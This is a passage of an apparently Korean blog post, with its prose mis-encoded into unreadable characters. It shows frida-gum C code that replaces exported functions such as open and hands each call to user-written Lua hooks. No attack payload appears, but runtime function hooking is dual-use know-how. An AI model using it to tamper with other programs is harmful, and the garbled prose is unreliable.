  &lt;li&gt;Lua ë‚´ì—ì„œ original_open í•¨ìˆ˜ë¥¼ í˜¸ì¶œí–ˆì„ë•Œ ì›ë³¸ open í•¨ìˆ˜ í˜¸ì¶œ&lt;/li&gt;
  &lt;li&gt;Luaì˜ new_open í•¨ìˆ˜ì—ì„œ ë°˜í™˜ëœ ê°’ì„ open ë°˜í™˜ ê°’ìœ¼ë¡œ ì „ë‹¬&lt;/li&gt;
&lt;/ol&gt;

&lt;p&gt;1ë²ˆì˜ ê²½ìš° í¸ì˜ìƒ frida-gum ëª¨ë“ˆì„ ì‚¬ìš©í•˜ì˜€ëŠ”ë° ì›ë³¸ í•¨ìˆ˜ê°€ ë°˜ë“œì‹œ í˜¸ì¶œë˜ëŠ” Interceptor ëŒ€ì‹  Replace ê¸°ëŠ¥ì„ ì‚¬ìš©í•˜ì˜€ìŠµë‹ˆë‹¤. Replaceì˜ ê²½ìš° í›„í‚¹ëœ í•¨ìˆ˜ê°€ ë°˜í™˜í•˜ê¸° ì „ì— ë‹¤ì‹œ í•¨ìˆ˜ë¥¼ í˜¸ì¶œí•´ì£¼ë©´ ì›ë³¸ í•¨ìˆ˜ê°€ í˜¸ì¶œë˜ë„ë¡ êµ¬í˜„ë˜ì–´ìˆìŠµë‹ˆë‹¤.&lt;/p&gt;

&lt;div class=&quot;language-cpp highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;		&lt;span class=&quot;n&quot;&gt;gum_init_embedded&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;();&lt;/span&gt;
    &lt;span class=&quot;n&quot;&gt;interceptor&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;gum_interceptor_obtain&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;();&lt;/span&gt;
    &lt;span class=&quot;n&quot;&gt;gum_interceptor_begin_transaction&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;interceptor&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;

    &lt;span class=&quot;n&quot;&gt;lua_pushcfunction&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;L&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;lua_replace_attach&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
    &lt;span class=&quot;n&quot;&gt;lua_setglobal&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;L&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&quot;hook&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;

    &lt;span class=&quot;n&quot;&gt;lua_pushcfunction&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;L&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;lua_pointer_to_string&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
    &lt;span class=&quot;n&quot;&gt;lua_setglobal&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;L&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&quot;p2string&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;

    &lt;span class=&quot;n&quot;&gt;lua_pushcfunction&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;L&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;lua_pointer_to_number&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
    &lt;span class=&quot;n&quot;&gt;lua_setglobal&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;L&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&quot;p2number&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;

    &lt;span class=&quot;n&quot;&gt;luaL_dofile&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;L&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&quot;hook.lua&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;

    &lt;span class=&quot;n&quot;&gt;gum_interceptor_end_transaction&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;interceptor&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;ì´ì œ ì‹¤ì œ êµ¬í˜„ì„ ìœ„í•´ ì‚¬ìš©ìì—ê²Œ ì œê³µí•  ì—¬ëŸ¬ í•¨ìˆ˜ë¥¼ ì •ì˜í•©ë‹ˆë‹¤.
luaL_dofileê°€ í˜¸ì¶œë˜ë©´ ì‚¬ìš©ìê°€ ì‘ì„±í•œ Lua ìŠ¤í¬ë¦½íŠ¸ë¥¼ íŒŒì‹±í•˜ì—¬ ì‚¬ìš©ìê°€ ìš”êµ¬í•œ í•¨ìˆ˜ë“¤ì„ í›„í‚¹í•˜ê²Œ ë©ë‹ˆë‹¤.&lt;/p&gt;

&lt;div class=&quot;language-cpp highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;k&quot;&gt;typedef&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;struct&lt;/span&gt; &lt;span class=&quot;nc&quot;&gt;_HookChain&lt;/span&gt;
&lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
    &lt;span class=&quot;kt&quot;&gt;int&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;id&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
    &lt;span class=&quot;kt&quot;&gt;int&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;argc&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
    &lt;span class=&quot;kt&quot;&gt;char&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;fn&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
    &lt;span class=&quot;kt&quot;&gt;char&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;newfn&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
    &lt;span class=&quot;kt&quot;&gt;char&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;orifn&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
&lt;span class=&quot;p&quot;&gt;}&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;HookChain&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;LpHookChain&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
&lt;span class=&quot;n&quot;&gt;HookChain&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;hc&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;100&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;];&lt;/span&gt;

&lt;span class=&quot;k&quot;&gt;static&lt;/span&gt; &lt;span class=&quot;kt&quot;&gt;int&lt;/span&gt; &lt;span class=&quot;nf&quot;&gt;lua_replace_attach&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;lua_State&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;L&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
&lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
    &lt;span class=&quot;c1&quot;&gt;//printf(&quot;lua_replace_attach:: called\n&quot;);&lt;/span&gt;
    &lt;span class=&quot;k&quot;&gt;const&lt;/span&gt; &lt;span class=&quot;kt&quot;&gt;char&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;fn&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;luaL_checkstring&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;L&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;1&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
    &lt;span class=&quot;kt&quot;&gt;int&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;argc&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;luaL_checknumber&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;L&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;2&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
    &lt;span class=&quot;k&quot;&gt;const&lt;/span&gt; &lt;span class=&quot;kt&quot;&gt;char&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;newfn&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;luaL_checkstring&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;L&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;3&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
    &lt;span class=&quot;k&quot;&gt;const&lt;/span&gt; &lt;span class=&quot;kt&quot;&gt;char&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;orifn&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;luaL_checkstring&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;L&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;4&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;

    &lt;span class=&quot;n&quot;&gt;hc&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;g_count&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;].&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;id&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;g_count&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
    &lt;span class=&quot;n&quot;&gt;hc&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;g_count&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;].&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;argc&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;argc&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
    &lt;span class=&quot;n&quot;&gt;string_copy&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;&amp;amp;&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;hc&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;g_count&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;].&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;fn&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;fn&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
    &lt;span class=&quot;n&quot;&gt;string_copy&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;&amp;amp;&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;hc&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;g_count&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;].&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;newfn&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;newfn&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
    &lt;span class=&quot;n&quot;&gt;string_copy&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;&amp;amp;&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;hc&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;g_count&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;].&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;orifn&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;orifn&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;

    &lt;span class=&quot;n&quot;&gt;lua_pushcfunction&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;L&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;lua_CFunction&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;original_function_handler&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
    &lt;span class=&quot;n&quot;&gt;lua_setglobal&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;L&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;orifn&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;

    &lt;span class=&quot;n&quot;&gt;gum_interceptor_replace&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;interceptor&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;
            &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;gpointer&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;gum_module_find_export_by_name&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;NULL&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;fn&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;),&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;hook_handler&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;GSIZE_TO_POINTER&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;&amp;amp;&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;hc&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;g_count&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]));&lt;/span&gt;

    &lt;span class=&quot;n&quot;&gt;lua_pushinteger&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;L&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
    &lt;span class=&quot;n&quot;&gt;g_count&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;++&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
    &lt;span class=&quot;k&quot;&gt;return&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;1&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
&lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;Luaì—ì„œ hookí•¨ìˆ˜ë¥¼ í˜¸ì¶œí•˜ë©´ C í•¨ìˆ˜ lua_interceptor_attachê°€ í˜¸ì¶œë˜ëŠ”ë° ì´ 4ê°œì˜ ì¸ìë¥¼ ë°›ì•„ì„œ ì²˜ë¦¬í•©ë‹ˆë‹¤.&lt;/p&gt;

&lt;p&gt;1ë²ˆì§¸ ì¸ìëŠ” í›„í‚¹í•  í•¨ìˆ˜ì˜ exportedëœ ì´ë¦„ì¸ë° gum_module_find_export_by_nameë¡œ í•¨ìˆ˜ì˜ í¬ì¸í„°ë¡œ ì „í™˜ë˜ê³  gum_interceptor_replaceë¥¼ í†µí•´ í›„í‚¹ë˜ê²Œ ë©ë‹ˆë‹¤.&lt;/p&gt;

&lt;p&gt;2~4ë²ˆì§¸ ì¸ìëŠ” ê°ê° í•¨ìˆ˜ ì¸ìì˜ ê°¯ìˆ˜, í›„í‚¹ë˜ì—ˆì„ë•Œ í˜¸ì¶œë  Lua í•¨ìˆ˜ëª…, ì›ë³¸í•¨ìˆ˜ë¡œ ì“¸ Lua í•¨ìˆ˜ëª…ì…ë‹ˆë‹¤.&lt;/p&gt;

&lt;p&gt;í›„í‚¹ëœ ëª¨ë“  í•¨ìˆ˜ëŠ” ê³µí†µì ìœ¼ë¡œ hook_handlerë¡œ ë„˜ê²¨ì§€ê³  1~4ë²ˆì§¸ ì¸ì ì •ë³´ë¥¼ ë‹´ì€ ë°ì´í„°ë¥¼ HookChain êµ¬ì¡°ì²´ë¡œ ì „ë‹¬í•©ë‹ˆë‹¤.&lt;/p&gt;

&lt;p&gt;ì¶”ê°€ì ìœ¼ë¡œ Lua ìŠ¤í¬ë¦½íŠ¸ì—ì„œ ì›ë³¸ í•¨ìˆ˜ë¥¼ í˜¸ì¶œí•  ìˆ˜ ìˆë„ë¡ ë³„ë„ì˜ í•¨ìˆ˜(original_function_handler)ë¥¼ ì •ì˜í•´ì¤ë‹ˆë‹¤.&lt;/p&gt;

&lt;div class=&quot;language-cpp highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;kt&quot;&gt;long&lt;/span&gt; &lt;span class=&quot;nf&quot;&gt;hook_handler&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;()&lt;/span&gt;
&lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
    &lt;span class=&quot;n&quot;&gt;GumInvocationContext&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;ic&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;gum_interceptor_get_current_invocation&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;();&lt;/span&gt;
    &lt;span class=&quot;n&quot;&gt;LpHookChain&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;hc&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;LpHookChain&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;gum_invocation_context_get_replacement_data&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;ic&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
    &lt;span class=&quot;c1&quot;&gt;//printf(&quot;hook_handler:: id=%d func=%s\n&quot;, hc-&amp;gt;id, hc-&amp;gt;fn);&lt;/span&gt;

    &lt;span class=&quot;n&quot;&gt;lua_getglobal&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;L&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;hc&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-&amp;gt;&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;newfn&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
    &lt;span class=&quot;k&quot;&gt;for&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;kt&quot;&gt;int&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;i&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;i&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;lt;&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;hc&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-&amp;gt;&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;argc&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;i&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;++&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
        &lt;span class=&quot;n&quot;&gt;lua_pushlightuserdata&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;L&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;gum_invocation_context_get_nth_argument&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;ic&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;i&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;));&lt;/span&gt;
    &lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
    &lt;span class=&quot;n&quot;&gt;lua_pcall&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;L&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;hc&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-&amp;gt;&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;argc&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;1&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;

    &lt;span class=&quot;kt&quot;&gt;long&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;ret_value&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;lua_tointeger&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;L&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;-&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;1&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
    &lt;span class=&quot;n&quot;&gt;lua_pop&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;L&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;1&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;

    &lt;span class=&quot;k&quot;&gt;return&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;ret_value&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
&lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;í›„í‚¹ëœ í•¨ìˆ˜ê°€ í˜¸ì¶œë˜ì—ˆì„ë•Œ hook_handler í•¨ìˆ˜ê°€ ì‹¤í–‰ë˜ê³  gum_invocation_context_get_replacement_dataë¡œ ì•„ê¹Œ ì €ì¥í–ˆë˜ ì¸ì ë°ì´í„°ë¥¼ ë‹¤ì‹œ ê°€ì ¸ì˜µë‹ˆë‹¤.&lt;/p&gt;

&lt;p&gt;ë‘ë²ˆì§¸ ì¸ìë¡œ ì „ë‹¬ë°›ì€ í•¨ìˆ˜ ì¸ì ê°¯ìˆ˜(hc-&amp;gt;argc)ë§Œí¼ Luaì¸ìë¥¼ pushí•´ì£¼ëŠ”ë° ì¸ìê°€ string íƒ€ì…ì¸ì§€ long íƒ€ì…ì¸ì§€ ì •ë³´ë¥¼ ì•Œ ìˆ˜ ì—†ìœ¼ë¯€ë¡œ ì‚¬ìš©ì ë°ì´í„° í˜•ì‹ìœ¼ë¡œ ì¸ìë¥¼ ì „ë‹¬í•œë‹¤ìŒ Lua í•¨ìˆ˜ë¥¼ í˜¸ì¶œí•©ë‹ˆë‹¤.&lt;/p&gt;

&lt;p&gt;ì—¬ê¸°ì„œ Lua í•¨ìˆ˜ëŠ” new_openì´ ë©ë‹ˆë‹¤.&lt;/p&gt;

&lt;div class=&quot;language-lua highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;k&quot;&gt;function&lt;/span&gt; &lt;span class=&quot;nf&quot;&gt;printf&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;...&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
    &lt;span class=&quot;nb&quot;&gt;print&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;string.format&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;...&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;))&lt;/span&gt;
&lt;span class=&quot;k&quot;&gt;end&lt;/span&gt;

&lt;span class=&quot;k&quot;&gt;function&lt;/span&gt; &lt;span class=&quot;nf&quot;&gt;new_open&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;pathname&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;flag&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
    &lt;span class=&quot;n&quot;&gt;ret&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;original_open&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;pathname&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;flag&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;

